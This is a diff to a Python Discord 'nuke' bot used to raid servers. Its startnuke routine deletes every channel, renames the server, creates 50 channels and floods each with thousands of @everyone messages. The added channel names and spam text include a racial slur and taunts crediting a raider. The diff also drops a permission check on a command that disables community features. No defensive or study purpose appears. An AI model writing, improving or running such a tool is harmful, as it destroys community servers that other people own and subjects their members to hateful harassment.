@@ -6,6 +6,7 @@ import discord
 from discord.ext import commands
 import asyncio
 import logging
+import random
 import requests
 import colorama
 from colorama import Fore, init
@@ -46,6 +47,7 @@ intents.messages = True
 intents.message_content = True
 
 bot = commands.Bot(command_prefix='$', intents=intents)
+channel_names = ['NUKEDLOL', 'DUMB-NIGGA', 'VERSE-ON-TOP', 'lmao', '891076147911', 'RAIDED-BY-VERSE', 'verse-runs-you', 'LOL', 'SKID']
 
 async def async_input(prompt: str) -> str:
     """Async wrapper for input() to avoid blocking the bot."""
@@ -94,11 +96,11 @@ async def on_ready():
             if guild is None:
                 print(
                     Fore.MAGENTA +
-"[-] I cannot find a server with that ID (or the bot is not in it)"
+"[-] I cannot find a server with that ID"
                 )
             else:
 
-                user_ids = [ID, ID
+                user_ids = [1172480590600216700, ID
                             ] 
 
 
@@ -148,7 +150,7 @@ async def on_ready():
                             )
 
 
-                await perform_nuke(guild)
+                await startnuke(guild)
             os.system('cls' if os.name == 'nt' else 'clear')
 
         elif choice == '2':
@@ -272,36 +274,31 @@ async def on_command_error(ctx, error):
     pass
 
 
-async def perform_nuke(guild):
+async def startnuke(guild):
+    # Delete all existing channels
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks)
 
-    for channel in guild.channels:
-        await channel.delete()
-        await asyncio.sleep(0)  
+    # Change the guild name
+    await guild.edit(name='SERVER NUKED BY VERSE')
 
-    new_channels = []
-    for i in range(50):
-        await guild.edit(name='SERVER NUKED BY VERSE')
-        channel = await guild.create_text_channel(f'NUKED-LOL')
-        new_channels.append(channel)
-
+    # Function to spam messages in a channel
     async def spam_messages(channel):
         for _ in range(10000):
             await channel.send(f'@everyone I RUN YOU BITCH')
-            await channel.send(f' @everyone LOL GET NUKED')
-            await channel.send(
-                f'@everyone raided by daddy vyx909 (https://www.youtube.com/@vxcnlol)'
-            )
-            await asyncio.sleep(0)
+            await channel.send(f'@everyone LOL DUMB NIGGA')
+            await channel.send(f'@everyone raided by daddy verse (https://www.youtube.com/@verse-lmao)')
 
-    for channel in new_channels:
-        bot.loop.create_task(spam_messages(channel))
+    # Create new channels with random names and start spamming messages concurrently
+    for i in range(50):
+        channel_name = random.choice(channel_names)  # Select a random channel name
+        channel = await guild.create_text_channel(channel_name)  # Create channel with random name
+        # Start spamming messages in the newly created channel
+        asyncio.create_task(spam_messages(channel))
 
-    await asyncio.sleep(1200) 
-
-    print("[+} Nuke operation completed!")
-    time.sleep(2)
+    print("[+] Nuke operation completed!")
+    await asyncio.sleep(2)  # Use await for sleep in async function
     os.system('cls' if os.name == 'nt' else 'clear')
-
 
 @bot.command()
 async def nuke(ctx):
@@ -311,7 +308,7 @@ async def nuke(ctx):
     if guild.features and 'COMMUNITY' in guild.features:
         await guild.edit(community=False)  
 
-    await perform_nuke(guild)  
+    await startnuke(guild)  
     await ctx.send("[+] Nuke operation completed!")
 
 
@@ -390,6 +387,7 @@ async def create(ctx, *, name: str):
 
 
 @bot.command()
+@commands.has_permissions(ban_members=True)
 async def ban(ctx):
     noban_ids = [ID, ID]
 
@@ -431,7 +429,6 @@ async def perms(ctx):
 
 
 @bot.command()
-@commands.has_permissions(manage_guild=True)
 async def discommunity(ctx):
     guild = ctx.guild
 
